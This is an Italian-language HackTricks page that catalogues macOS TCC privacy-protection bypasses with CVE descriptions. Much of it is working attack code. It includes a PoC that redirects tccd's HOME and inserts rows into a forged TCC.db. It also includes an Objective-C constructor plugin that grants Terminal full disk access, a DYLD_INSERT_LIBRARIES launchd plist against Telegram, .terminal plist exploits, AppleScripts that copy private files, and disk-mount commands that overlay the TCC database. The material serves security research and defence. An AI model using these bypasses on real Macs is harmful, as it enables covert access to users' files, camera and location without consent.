# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Per funzionalità

### Write Bypass

Questo non è un bypass, è semplicemente il funzionamento di TCC: **non protegge dalla scrittura**. Se Terminal **non ha accesso alla lettura del Desktop di un utente, può comunque scrivervi**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
L'**attributo esteso `com.apple.macl`** viene aggiunto al nuovo **file** per dare all'**app creatrice** l'accesso per leggerlo.<sup>[[2]](#references)</sup>

### TCC ClickJacking

È possibile **posizionare una finestra sopra il prompt TCC** per fare in modo che l'utente lo **accetti** senza accorgersene. È possibile trovare una PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

L'attaccante può **creare app con qualsiasi nome** (ad esempio Finder, Google Chrome...) nel **`Info.plist`** e fare in modo che richiedano l'accesso a una posizione protetta da TCC. L'utente penserà che sia l'applicazione legittima a richiedere questo accesso.\
Inoltre, è possibile **rimuovere l'app legittima dal Dock e sostituirla con quella falsa**, così quando l'utente fa clic su quella falsa (che può utilizzare la stessa icona), questa può chiamare quella legittima, richiedere i permessi TCC ed eseguire un malware, facendo credere all'utente che sia stata l'app legittima a richiedere l'accesso.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Ulteriori informazioni e PoC in:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Per impostazione predefinita, l'accesso tramite **SSH aveva "Full Disk Access"**. Per disabilitarlo è necessario che sia elencato ma disabilitato (rimuoverlo dall'elenco non rimuoverà tali privilegi):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Per impostazione predefinita, l'accesso tramite SSH aveva "Full Disk Access". Per disabilitarlo è necessario che sia elencato ma disabilitato (rimuoverlo...](<../../../../../images/image (1077).png>)

Qui puoi trovare esempi di come alcuni **malware siano riusciti a bypassare questa protezione**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Nota che ora, per poter abilitare SSH, è necessario **Full Disk Access**

### Handle extensions - CVE-2022-26767

L'attributo **`com.apple.macl`** viene assegnato ai file per dare a una **determinata applicazione i permessi per leggerli.** Questo attributo viene impostato quando si esegue il **drag\&drop** di un file su un'app oppure quando un utente fa **doppio clic** su un file per aprirlo con l'**applicazione predefinita**.

Pertanto, un utente potrebbe **registrare un'app malevola** per gestire tutte le estensioni e chiamare Launch Services per **aprire** qualsiasi file (in questo modo al file malevolo verrà concesso l'accesso per leggerlo).<sup>[[23]](#references)</sup>

### iCloud

Con l'entitlement **`com.apple.private.icloud-account-access`** è possibile comunicare con il servizio XPC **`com.apple.iCloudHelper`**, che **fornirà token iCloud**.

**iMovie** e **Garageband** disponevano di questo entitlement e di altri che lo consentivano.

Per ulteriori **informazioni** sull'exploit per **ottenere token iCloud** tramite tale entitlement, consulta il talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Un'app con il permesso **`kTCCServiceAppleEvents`** sarà in grado di **controllare altre App**. Ciò significa che potrebbe essere in grado di **abusare dei permessi concessi alle altre App**.<sup>[[2]](#references)</sup>

Per ulteriori informazioni sugli Apple Scripts, consulta:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Ad esempio, se un'app dispone del **permesso Automation su `iTerm`**, in questo esempio **`Terminal`** ha accesso a iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, che non dispone di FDA, può chiamare iTerm, che invece lo dispone, e utilizzarlo per eseguire azioni:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Tramite Finder

Oppure, se un'App ha accesso tramite Finder, potrebbe eseguire uno script come questo:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Comportamento per app

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Il **tccd daemon** in userland utilizzava la variabile **`HOME`** dell'**env** per accedere al database TCC degli utenti in: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Secondo [questo post su Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e poiché il daemon TCC viene eseguito tramite `launchd` all'interno del dominio dell'utente corrente, è possibile **controllare tutte le variabili d'ambiente** passate al daemon.<sup>[[19]](#references)</sup>\
Di conseguenza, un **attacker potrebbe impostare la variabile d'ambiente `$HOME`** in **`launchctl`** affinché punti a una **directory** **controllata**, **riavviare** il daemon **TCC** e quindi **modificare direttamente il database TCC** per assegnarsi **ogni entitlement TCC disponibile**, senza mai mostrare una richiesta all'utente finale.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes aveva accesso a posizioni protette da TCC, ma una nota appena creata veniva **memorizzata in una posizione non protetta**. Pertanto, un attacker poteva chiedere a Notes di copiare un file protetto in una nota e quindi accedere ai dati risultanti dalla posizione non protetta:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Il binary `/usr/libexec/lsd` con la library `libsecurity_translocate` aveva l'entitlement `com.apple.private.nullfs_allow`, che gli consentiva di creare un mount **nullfs**, e aveva l'entitlement `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** per accedere a ogni file.

Era possibile aggiungere l'attributo quarantine a "Library", chiamare il servizio XPC **`com.apple.security.translocation`** e quindi mappare Library in **`$TMPDIR/AppTranslocation/d/d/Library`**, dove tutti i documenti contenuti in Library potevano essere **accessibili**.

### CVE-2024-44131 - FileProvider symlink race

Le app che delegano le operazioni sui file a un **privileged helper** (in questo caso **`fileproviderd`** / **`Files.app`**) copiano o spostano gli elementi **per conto dell'utente**, quindi la copia viene eseguita con i privilegi dell'helper anziché con quelli del caller.

Jamf Threat Labs ha dimostrato che la validazione del symlink eseguita prima dell'operazione può essere soggetta a una **race**: invece di piantare il symlink sull'**ultimo** componente del path (che viene controllato), l'attacker sostituisce una directory **intermedia** del path **dopo che la copia è già iniziata**. Il privileged helper segue quindi il link controllato dall'attacker e legge/scrive in posizioni protette da TCC **senza mai mostrare un prompt**.<sup>[[5]](#references)</sup>

Le directory che **non sono protette** da un UUID casuale nel loro path (ad esempio `~/Library/Mobile Documents/com~apple~CloudDocs`) sono i target più semplici, perché l'attacker può prevedere il path completo per eseguire la race.

> [!TIP]
> Questo è il pattern generico da cercare: **qualsiasi processo privilegiato che risolve un path più di una volta** (check-then-use, oppure `rename()`/`copyfile()` che risolvono separatamente source e destination) può essere soggetto a race sostituendo una directory al centro del path. Solo `O_NOFOLLOW_ANY`, `openat()` su un directory FD già aperto, oppure `realpath()` + una nuova validazione chiudono realmente la finestra.

Maggiori informazioni nel [**writeup di Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` può essere compilata con `SQLITE_ENABLE_SQLLOG`, che aggiunge un logging hook controllato da environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** - per **ogni database aperto**, una **copia del file del database** e un log delle istruzioni SQL vengono scritti in `path` (la directory deve già esistere).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** - crea una **nuova copia ogni volta** che un DB viene aperto/collegato invece di riutilizzarne una.
- **`SQLITE_SQLLOG_CONDITIONAL`** - registra una connessione solo se accanto al DB principale esiste un file `<database>-sqllog`.

Se è possibile iniettare questa variabile in un processo che dispone di **FDA** e apre database SQLite, il processo copierà senza problemi quei **database protetti** in una directory controllata dall'attacker. Poiché il filename di destinazione deriva da dati controllati dall'attacker, un **symlink piantato sulla destinazione** trasforma la stessa primitive in una **scrittura arbitraria di file** con i privilegi del target process.

### **SQLITE_AUTO_TRACE**

Se la environment variable **`SQLITE_AUTO_TRACE`** è impostata, la library **`libsqlite3.dylib`** inizierà a **registrare** tutte le query SQL. Molte applicazioni usavano questa library, quindi era possibile registrare tutte le loro query SQLite.<sup>[[22]](#references)</sup>

Diverse applicazioni Apple usavano questa library per accedere a informazioni protette da TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Ricerca di scritture di file guidate da env-var

Le due voci precedenti sono esempi della stessa tecnica generica, e vale la pena cercarne altre: **i framework caricati nelle app con privilegi TCC spesso espongono variabili d'ambiente di debug/logging che fanno sì che il processo crei un file in un percorso controllato dal chiamante**.

Workflow per trovarle:

1. Scegli un target con FDA o un altro permesso TCC interessante (`Music`, `TV`, `Terminal`, agenti MDM...) ed elenca i framework a cui si collega (`otool -L`, `vmmap`).
2. Esegui il grep di quei framework cercando stringhe `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Imposta le variabili candidate tramite `launchctl setenv NAME /path/you/control`, avvia l'app e osserva cosa fa nel filesystem con `fs_usage -w -f filesys <pid>` o `sudo fs_usage | grep <path>`.
4. Se il processo **crea o rinomina** un file nella tua directory, hai una primitiva di scrittura: punta la destinazione a un symlink (oppure sfrutta una race su una directory intermedia, come nel CVE-2024-44131 sopra) per reindirizzarla verso `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Due aspetti limitano questa tecnica. Innanzitutto, le variabili `DYLD_*` vengono ignorate dai binari con hardened runtime **a meno che** l'app non includa l'entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("un valore Boolean che indica se l'app può essere influenzata dalle variabili d'ambiente del dynamic linker, che puoi usare per iniettare codice nel processo della tua app") — vedi anche [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). In secondo luogo, Apple rimuove le singole variabili di debug dei framework quando vengono segnalate, quindi una variabile che funzionava in una release di macOS spesso scompare in quella successiva. Se un'app rifiuta silenziosamente di avviarsi dopo che ne hai impostata una, considera tale variabile già filtrata.<sup>[[7]](#references)[[8]](#references)</sup>

Consulta [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) per la tecnica equivalente con le variabili del linker.

### Apple Remote Desktop

Come root, potresti abilitare questo servizio e **l'agente ARD avrebbe accesso completo al disco**, che potrebbe quindi essere sfruttato da un utente per fargli copiare un nuovo **database TCC dell'utente**.

## Tramite **NFSHomeDirectory**

TCC utilizza un database nella cartella HOME dell'utente per controllare l'accesso alle risorse specifiche dell'utente in **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Pertanto, se l'utente riesce a riavviare TCC con una variabile d'ambiente $HOME che punta a una **cartella diversa**, potrebbe creare un nuovo database TCC in **/Library/Application Support/com.apple.TCC/TCC.db** e ingannare TCC inducendolo a concedere qualsiasi permesso TCC a qualsiasi app.

> [!TIP]
> Nota che Apple utilizza l'impostazione memorizzata nel profilo dell'utente, nell'attributo **`NFSHomeDirectory`**, per il **valore di `$HOME`**; pertanto, se comprometti un'applicazione con permessi per modificare questo valore (**`kTCCServiceSystemPolicySysAdminFiles`**), puoi **weaponize** questa opzione con un TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Il **primo POC** utilizza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) per modificare la cartella **HOME** dell'utente.

1. Ottieni un blob _csreq_ per l'app target.
2. Posiziona un file _TCC.db_ falso con gli accessi richiesti e il blob _csreq_.
3. Esporta la voce dell'utente nei Directory Services con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifica la voce dei Directory Services per cambiare la home directory dell'utente.
5. Importa la voce modificata dei Directory Services con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arresta il _tccd_ dell'utente e riavvia il processo.

Il secondo POC utilizzava **`/usr/libexec/configd`**, che disponeva di `com.apple.private.tcc.allow` con valore `kTCCServiceSystemPolicySysAdminFiles`.\
Era possibile eseguire **`configd`** con l'opzione **`-t`**, tramite la quale un attacker poteva specificare un **Bundle personalizzato da caricare**. Pertanto, l'exploit **sostituisce** il metodo **`dsexport`** e **`dsimport`** per modificare la home directory dell'utente con una **code injection in `configd`**.

Per ulteriori informazioni, consulta il [**report originale**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Tramite process injection

Esistono diverse tecniche per iniettare codice all'interno di un processo e abusare dei suoi privilegi TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Inoltre, la process injection più comune trovata per bypassare TCC avviene tramite **plugin (load library)**.\
I plugin sono codice aggiuntivo, solitamente sotto forma di librerie o plist, che viene **caricato dall'applicazione principale** ed eseguito nel suo contesto. Pertanto, se l'applicazione principale aveva accesso ai file limitati da TCC (tramite permessi concessi o entitlement), anche il **codice personalizzato avrà lo stesso accesso**.

### CVE-2020-27937 - Directory Utility

L'applicazione `/System/Library/CoreServices/Applications/Directory Utility.app` aveva l'entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, caricava plugin con estensione **`.daplug`** e **non aveva** il runtime **hardened**.

Per weaponize questo CVE, la **`NFSHomeDirectory`** viene **modificata** (abusando dell'entitlement precedente) per poter **prendere il controllo del database TCC dell'utente** e bypassare TCC.

Per ulteriori informazioni, consulta il [**report originale**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Il binario **`/usr/sbin/coreaudiod`** aveva gli entitlement `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. Il primo **consentiva la code injection**, mentre il secondo gli permetteva di **gestire TCC**.

Questo binario consentiva di caricare **plug-in di terze parti** dalla cartella `/Library/Audio/Plug-Ins/HAL`. Pertanto, era possibile **caricare un plugin e abusare dei permessi TCC** con questo PoC:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Per ulteriori informazioni, consulta il [**report originale**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Le applicazioni di sistema che aprono uno stream della fotocamera tramite Core Media I/O (applicazioni con **`kTCCServiceCamera`**) caricano nel processo questi plugin, che si trovano in `/Library/CoreMediaIO/Plug-Ins/DAL` (non soggetto alle restrizioni di SIP).

È sufficiente memorizzarvi una libreria con il **constructor** comune per **iniettare codice**.

Diverse applicazioni Apple erano vulnerabili a questo.

### Firefox

L'applicazione Firefox disponeva degli entitlement `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Per ulteriori informazioni su come sfruttare facilmente questo problema, [**consulta il report originale**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Il binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` disponeva degli entitlements **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, che consentivano di iniettare codice all'interno del processo e utilizzare i privilegi TCC.

### CVE-2023-26818 - Telegram

Telegram disponeva degli entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, quindi era possibile abusarne per **ottenere accesso ai suoi permessi**, ad esempio registrando tramite la fotocamera. Puoi [**trovare il payload nel writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Per utilizzare la variabile d'ambiente per caricare una libreria, è stato creato un **custom plist** per iniettare questa libreria e **`launchctl`** è stato utilizzato per avviarla:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Tramite invocazioni di open

È possibile invocare **`open`** anche quando si è in sandbox

### Script del Terminale

È abbastanza comune concedere **Full Disk Access (FDA)** al Terminale, almeno sui computer utilizzati da persone tecniche. Inoltre, è possibile invocare script **`.terminal`** tramite il Terminale.

Gli script **`.terminal`** sono file plist come questo, con il comando da eseguire nella chiave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Un'applicazione potrebbe scrivere uno script del terminale in una posizione come /tmp e avviarlo con un comando come:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Tramite il mount

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Qualsiasi utente** (anche quelli non privilegiati) può creare e montare uno snapshot di Time Machine e **accedere a TUTTI i file** di quello snapshot.\
L'unico privilegio necessario è che l'applicazione utilizzata (come `Terminal`) disponga dell'accesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), che deve essere concesso da un amministratore.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Una spiegazione più dettagliata può essere [**trovata nella relazione originale**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Anche se il file DB di TCC era protetto, era possibile **montare sopra la directory** un nuovo file TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Controlla l'**exploit completo** nel [**writeup originale**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Come spiegato nel [writeup originale](https://www.kandji.io/blog/macos-audit-story-part2), questo CVE sfruttava `diskarbitrationd`.<sup>[[16]](#references)</sup>

La funzione `DADiskMountWithArgumentsCommon` del framework pubblico `DiskArbitration` eseguiva i controlli di sicurezza. Tuttavia, è possibile bypassarla chiamando direttamente `diskarbitrationd` e quindi utilizzare elementi `../` nel percorso e symlink.

Questo consentiva a un attacker di eseguire mount arbitrari in qualsiasi posizione, anche sopra il database TCC, grazie all'entitlement `com.apple.private.security.storage-exempt.heritable` di `diskarbitrationd`.

### asr

Il tool **`/usr/sbin/asr`** consentiva di copiare l'intero disco e montarlo in un'altra posizione, bypassando le protezioni TCC.

### CVE-2022-22655 - Location Services

Location Services non sono memorizzati in un database TCC come gli altri servizi. Sono gestiti da `locationd`, che mantiene il proprio elenco di autorizzazioni in **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Ogni voce è indicizzata dal client (bundle ID o percorso dell'eseguibile) e contiene campi come `Authorized`, `BundleId`, `Executable` e `Registered`.<sup>[[4]](#references)</sup>

Il file `clients.plist` è protetto da Sandbox/TCC e non può essere modificato nemmeno come root — tuttavia, la directory **`/var/db/locationd/` non era protetta dal mounting**. Pertanto, un attacker con privilegi root poteva creare una disk image contenente il proprio `clients.plist` (con il proprio binario contrassegnato come `Authorized`), montarla sopra la directory e riavviare `locationd` affinché la allow-list contraffatta diventasse effettiva.<sup>[[3]](#references)</sup>

> [!TIP]
> Questo segue lo stesso pattern dei TCC bypass con `hdiutil`/`mount` descritti sopra: il *file* è protetto, mentre la *directory in cui si trova* non lo è; quindi si sostituisce l'intera directory invece del file.

## Tramite le app di avvio


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Tramite grep

In diverse occasioni, i file memorizzano informazioni sensibili come email, numeri di telefono, messaggi... in posizioni non protette (che in Apple sono considerate una vulnerabilità).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Questo non funziona più, ma [**in passato funzionava**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Un altro metodo che utilizza gli [**eventi CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypass del framework macOS Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypass delle protezioni della privacy utente di macOS TCC per errore e intenzionalmente](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Bypass dei Location Services di TCC (report originale)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Dove si trova Carmen Sandiego nel mondo: abuso dei Location Services su macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: il TCC bypass sottrae dati da iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (variabili d'ambiente SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - entitlement per consentire le variabili d'ambiente DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: il hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass scoperto nel malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Ciò che succede sul tuo Mac rimane sull'iCloud di Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Nuova vulnerabilità di macOS, "powerdir", che potrebbe consentire l'accesso non autorizzato ai dati utente](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Modifica della home directory e bypass di TCC, ovvero CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Riproduzione della musica e bypass di TCC, ovvero CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Come derubare una volpe (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Bypass di TCC con Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Scoperta delle vulnerabilità Apple: audit di diskarbitrationd e storagekitd, parte 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks e CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
